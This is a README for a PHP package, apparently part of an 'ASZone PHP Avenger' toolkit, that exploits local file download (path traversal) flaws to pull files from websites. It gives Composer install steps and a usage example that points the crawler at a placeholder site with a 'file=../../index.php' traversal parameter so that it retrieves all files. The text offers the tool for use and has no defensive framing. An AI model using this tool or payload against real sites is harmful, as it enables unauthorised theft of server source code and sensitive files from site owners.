# Crawler - Download File By Local File Download

> ASZone - Crawler - Download File By Local File Download

### Beta

## Instalation

The recommended way to install PHP Avenger is through
[Composer](http://getcomposer.org).

```bash
# Install Composer
curl -sS https://getcomposer.org/installer | php
```

Next, run the Composer command to install the latest beta version of Php Avenger SH:

```bash
php composer.phar require aszone/crawler/download-file-by-lfd
```

## Basic Usage
```bash
$command=array();
$url="http://www.xxxx.com/download.php?file=../../index.php";
$crawler = new DownloadByLocalFileDownload($command,$url);
$crawler->getAllFiles();

```

## Help and docs
* [Documentation](http://phpavenger.aszone.com.br).
* [Examples](http://phpavenger.aszone.com.br/examples).
* [Videos](http://youtube.com/aszone).
* [Steakoverflow](http://phpavenger.aszone.com.br).

